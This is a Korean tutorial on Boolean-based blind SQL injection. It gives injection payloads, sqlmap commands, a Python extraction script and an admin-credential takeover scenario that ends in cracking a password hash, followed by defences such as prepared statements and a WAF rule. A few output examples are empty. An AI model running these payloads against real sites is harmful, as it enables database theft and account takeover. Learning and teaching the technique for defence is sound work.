Boolean-based Blind SQL Injection

Boolean-based Blind SQLi는 애플리케이션의 참(True)/거짓(False) 응답 차이를 이용하여 데이터를 한 글자씩 추출하는 Blind SQL Injection 기법입니다.

개념 (Concept)​

Boolean-based Blind SQLi란?​

Boolean-based Blind SQL Injection은 SQL 쿼리의 조건이 참 또는 거짓일 때 웹 애플리케이션의 응답이 달라지는 것을 이용하여 데이터베이스 정보를 추론하는 기법입니다.

작동 원리:

참 조건 → 정상 페이지 (상품 정보 표시)
거짓 조건 → 빈 페이지 또는 에러 메시지

예시:

-- 참 (True): 정상 응답
SELECT * FROM products WHERE id=1 AND 1=1

-- 거짓 (False): 빈 응답
SELECT * FROM products WHERE id=1 AND 1=2

응답 차이 식별 방법​

응답 요소참일 때거짓일 때
페이지 내용상품 정보 표시빈 페이지
페이지 길이1500 bytes200 bytes
HTTP 상태200 OK200 OK (내용만 다름)
특정 문자열"Welcome" 존재"Welcome" 없음
이미지이미지 로드이미지 없음

수동 공격 (Manual Exploitation)​

단계 1: 취약점 확인​

기본 테스트​

참 조건:

http://example.com/product?id=1' AND '1'='1

거짓 조건:

http://example.com/product?id=1' AND '1'='2

응답 확인:

  • 두 요청의 응답이 다르면 Boolean-based SQLi 취약
  • 응답 길이, 내용, 특정 문자열 유무 비교

다양한 True/False 페이로드​

# True 페이로드
' AND 1=1--
' OR 'a'='a'--
' AND 'x'='x'--

# False 페이로드
' AND 1=2--
' OR 'a'='b'--
' AND 'x'='y'--

단계 2: 데이터베이스 이름 길이 확인​

MySQL:

' AND LENGTH(database())=1--   (거짓)
' AND LENGTH(database())=2--   (거짓)
' AND LENGTH(database())=3--   (거짓)
' AND LENGTH(database())=4--   (거짓)
' AND LENGTH(database())=5--   (거짓)
' AND LENGTH(database())=6--   (참!)

MSSQL:

' AND LEN(DB_NAME())=6--

PostgreSQL:

' AND LENGTH(current_database())=6--

→ 데이터베이스 이름은 6글자

단계 3: 데이터베이스 이름 추출​

방법 1: 문자 단위 비교​

1번째 글자:

' AND SUBSTRING(database(), 1, 1)='a'--   (거짓)
' AND SUBSTRING(database(), 1, 1)='b'--   (거짓)
' AND SUBSTRING(database(), 1, 1)='c'--   (거짓)
...
' AND SUBSTRING(database(), 1, 1)='w'--   (참!)

2번째 글자:

' AND SUBSTRING(database(), 2, 1)='a'--   (참!)

3번째 글자:

' AND SUBSTRING(database(), 3, 1)='b'--   (참!)

반복 후 결과:

1번째: w
2번째: a
3번째: b
4번째: a
5번째: p
6번째: p

→ 데이터베이스 이름: webapp

방법 2: ASCII 값 비교 (이진 탐색)​

효율적인 방법: ASCII 값 범위를 절반씩 좁혀가기

-- 1번째 글자의 ASCII 값이 100보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 100--   (참)

-- 118보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 118--   (거짓)

-- 109보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 109--   (참)

-- 114보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 114--   (참)

-- 116보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 116--   (참)

-- 117보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 117--   (거짓)

-- 정확한 값 확인
' AND ASCII(SUBSTRING(database(), 1, 1)) = 119--   (참!)

→ 119 = ASCII('w')

이진 탐색의 장점:

  • 최대 7번 시도로 1글자 추출 (전체 ASCII 범위 0~127)
  • 알파벳만 고려하면 5번으로 단축 가능

단계 4: 테이블 이름 추출​

테이블 개수 확인​

MySQL:

' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=1--   (거짓)
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=5--   (참!)

→ 테이블 5개 존재

첫 번째 테이블 이름 길이​

' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=5--   (참!)

→ 첫 번째 테이블은 5글자

첫 번째 테이블 이름 추출​

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='u'--   (참!)
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 2, 1)='s'--   (참!)
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 3, 1)='e'--   (참!)
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 4, 1)='r'--   (참!)
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 5, 1)='s'--   (참!)

→ 첫 번째 테이블: users

두 번째 테이블 추출​

-- LIMIT 1,1로 변경
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)='p'--

단계 5: 컬럼 이름 추출​

컬럼 개수 확인:

' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=5--   (참!)

첫 번째 컬럼 이름:

' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1)='i'--   (참!)
' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 2, 1)='d'--   (참!)

→ 첫 번째 컬럼: id

단계 6: 실제 데이터 추출​

데이터 행 개수 확인​

' AND (SELECT COUNT(*) FROM users)=10--   (참!)

→ users 테이블에 10개 행 존재

첫 번째 사용자 이름 추출​

길이 확인:

' AND LENGTH((SELECT username FROM users LIMIT 0,1))=5--   (참!)

문자 추출:

' AND SUBSTRING((SELECT username FROM users LIMIT 0,1), 1, 1)='a'--   (참!)
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1), 2, 1)='d'--   (참!)
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1), 3, 1)='m'--   (참!)
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1), 4, 1)='i'--   (참!)
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1), 5, 1)='n'--   (참!)

→ 첫 번째 사용자: admin

비밀번호 추출​

' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='5'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 2, 1)='f'--
...

자동화 도구 (Automated Tools)​

SQLMap - Boolean-based 전용​

기본 스캔​

sqlmap -u "http://example.com/product?id=1" --technique=B --batch

출력 예시:

[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.41, PHP 7.4.3
back-end DBMS: MySQL >= 5.0

현재 데이터베이스 추출​

sqlmap -u "http://example.com/product?id=1" --technique=B --current-db

출력 예시:

current database: 'webapp'

테이블 열거​

sqlmap -u "http://example.com/product?id=1" --technique=B -D webapp --tables

출력 예시:

Database: webapp
[5 tables]
+-----------+
| users     |
| products  |
| orders    |
| sessions  |
| logs      |
+-----------+

데이터 덤프 (진행률 표시)​

sqlmap -u "http://example.com/product?id=1" --technique=B -D webapp -T users --dump

출력 예시:

Verbose 모드로 페이로드 확인​

sqlmap -u "http://example.com/product?id=1" --technique=B -v 3 --current-db

출력 예시 (실제 사용된 페이로드):

Python 스크립트 예시​

간단한 Boolean-based SQLi 자동화 스크립트:

import requests
import string

url = "http://example.com/product?id=1"
charset = string.ascii_lowercase + string.digits + '_'
result = ""

# DB 이름 추출
print("[*] Extracting database name...")
for position in range(1, 20):
    for char in charset:
        payload = f"' AND SUBSTRING(database(), {position}, 1)='{char}'--"
        r = requests.get(url + payload)

        # 참일 때 특정 문자열 존재
        if "Product Name" in r.text:
            result += char
            print(f"[+] Found character: {char}")
            break
    else:
        # 더 이상 문자 없음
        break

print(f"[+] Database name: {result}")

출력 예시:

[*] Extracting database name...
[+] Found character: w
[+] Found character: a
[+] Found character: b
[+] Found character: a
[+] Found character: p
[+] Found character: p
[+] Database name: webapp

고급 기법​

1. LIKE 연산자 활용​

와일드카드를 사용하여 부분 매칭:

-- 테이블 이름이 'user'로 시작하는지 확인
' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'user%' LIMIT 1)--

2. REGEXP 사용 (MySQL)​

정규표현식으로 패턴 매칭:

-- username이 'admin'으로 시작하는지 확인
' AND (SELECT username FROM users LIMIT 0,1) REGEXP '^admin'--

-- 첫 글자가 a~m 사이인지 확인
' AND SUBSTRING(database(), 1, 1) REGEXP '[a-m]'--

3. 대소문자 구분 우회​

일부 DBMS는 대소문자를 구분하지 않음:

-- MySQL (기본적으로 대소문자 구분 안 함)
' AND SUBSTRING(database(), 1, 1)='W'--   (참 - 실제로는 'w')

-- 정확한 비교 (BINARY 사용)
' AND SUBSTRING(database(), 1, 1) BINARY ='w'--

4. 특수문자 처리​

-- 따옴표 이스케이프
' AND SUBSTRING(database(), 1, 1)=0x77--   (0x77 = 'w'의 16진수)

-- CHAR 함수 사용
' AND SUBSTRING(database(), 1, 1)=CHAR(119)--   (119 = 'w'의 ASCII)

실전 공격 시나리오​

시나리오: 관리자 계정 탈취​

취약한 URL:

http://shop.example.com/item.php?id=5

목표: 관리자 계정의 사용자명과 비밀번호 추출

1. Boolean-based 취약점 확인​

http://shop.example.com/item.php?id=5' AND 1=1--

→ 정상 페이지 (상품 정보 표시)

http://shop.example.com/item.php?id=5' AND 1=2--

→ 빈 페이지

결론: Boolean-based SQLi 취약

2. 관리자 계정 존재 확인​

http://shop.example.com/item.php?id=5' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0--

→ 정상 페이지 (관리자 계정 존재)

3. 관리자 사용자명 길이​

http://shop.example.com/item.php?id=5' AND LENGTH((SELECT username FROM users WHERE role='admin' LIMIT 0,1))=5--

→ 정상 페이지 (사용자명 5글자)

4. 관리자 사용자명 추출​

http://shop.example.com/item.php?id=5' AND SUBSTRING((SELECT username FROM users WHERE role='admin'), 1, 1)='a'--

→ 정상 페이지 (첫 글자 'a')

반복 후:

a d m i n

5. 비밀번호 해시 추출​

http://shop.example.com/item.php?id=5' AND LENGTH((SELECT password FROM users WHERE username='admin'))=32--

→ 32글자 (MD5 해시)

http://shop.example.com/item.php?id=5' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='5'--

전체 해시 추출 후:

5f4dcc3b5aa765d61d8327deb882cf99

6. 해시 크랙​

온라인 MD5 디코더 또는 hashcat 사용:

echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt rockyou.txt

결과:

5f4dcc3b5aa765d61d8327deb882cf99:password

응답 차이가 미미할 때​

1. Content-Length 비교​

HTTP 응답 헤더의 Content-Length 확인:

import requests

url_true = "http://example.com/product?id=1' AND 1=1--"
url_false = "http://example.com/product?id=1' AND 1=2--"

r_true = requests.get(url_true)
r_false = requests.get(url_false)

print(f"True: {len(r_true.text)} bytes")
print(f"False: {len(r_false.text)} bytes")

출력:

True: 1523 bytes
False: 234 bytes

2. 특정 문자열 존재 확인​

if "Product Name:" in r.text:
    # 참 조건
else:
    # 거짓 조건

3. 정규표현식 패턴 매칭​

import re

if re.search(r'<h1>.*</h1>', r.text):
    # 참 조건

최적화 및 속도 향상​

1. 이진 탐색 사용​

일반 탐색 (최대 26번):

for char in 'abcdefghijklmnopqrstuvwxyz':
    # 최대 26번 요청

이진 탐색 (최대 5번):

low, high = ord('a'), ord('z')
while low <= high:
    mid = (low + high) // 2
    payload = f"' AND ASCII(SUBSTRING(database(), 1, 1))>{mid}--"
    # 최대 5번 요청

2. 멀티스레딩​

여러 글자를 동시에 추출:

import threading

def extract_char(position):
    # 각 위치의 문자 추출

threads = []
for i in range(1, 20):
    t = threading.Thread(target=extract_char, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

3. 캐싱​

이미 확인한 결과 저장:

cache = {}

def check_condition(payload):
    if payload in cache:
        return cache[payload]

    r = requests.get(url + payload)
    result = "Product" in r.text
    cache[payload] = result
    return result

방어 기법​

1. Prepared Statements​

PHP (PDO):

$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$_GET['id']]);

Python (sqlite3):

cursor.execute("SELECT * FROM products WHERE id = ?", (id,))

2. 응답 표준화​

모든 경우에 동일한 응답 반환:

$result = $conn->query($query);

// 에러 또는 빈 결과
if (!$result || $result->num_rows === 0) {
    // 동일한 에러 페이지
    include('generic_error.php');
    exit();
}

// 정상 결과도 일정한 형식
include('product.php');

3. 입력 검증​

$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false || $id < 1) {
    die("Invalid input");
}

4. WAF 룰​

ModSecurity:

SecRule ARGS "@rx (AND|OR).*=.*(AND|OR)" \
    "id:1003,phase:2,deny,status:403,msg:'Boolean-based SQLi attempt'"

트러블슈팅 체크리스트​

응답 차이를 찾을 수 없을 때​

  • Content-Length 비교
  • 특정 HTML 태그나 문자열 존재 확인
  • HTTP 상태 코드 확인
  • Time-based SQLi로 전환 고려

추출 속도가 너무 느릴 때​

  • 이진 탐색 알고리즘 사용
  • 멀티스레딩 또는 비동기 요청
  • SQLMap 자동화 도구 사용
  • 추출 범위 좁히기 (알파벳+숫자만)

특정 문자 추출 실패​

  • URL 인코딩 확인
  • 16진수(0x) 또는 CHAR() 함수 사용
  • LIKE 또는 REGEXP 시도
  • 대소문자 구분 확인

빠른 명령어 참조 (Quick Reference)​

MySQL​

# 길이 확인
' AND LENGTH(database())=6--
' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=5--

# 문자 비교
' AND SUBSTRING(database(), 1, 1)='w'--
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1), 1, 1)='a'--

# ASCII 이진 탐색
' AND ASCII(SUBSTRING(database(), 1, 1))>100--
' AND ASCII(SUBSTRING(database(), 1, 1))=119--

# 데이터 존재 확인
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=5--

SQLMap​

# Boolean-based 스캔
sqlmap -u "URL" --technique=B --batch

# 데이터베이스 추출
sqlmap -u "URL" --technique=B --current-db

# 테이블 열거
sqlmap -u "URL" --technique=B -D dbname --tables

# 데이터 덤프
sqlmap -u "URL" --technique=B -D dbname -T users --dump

# 특정 컬럼만
sqlmap -u "URL" --technique=B -D dbname -T users -C username,password --dump
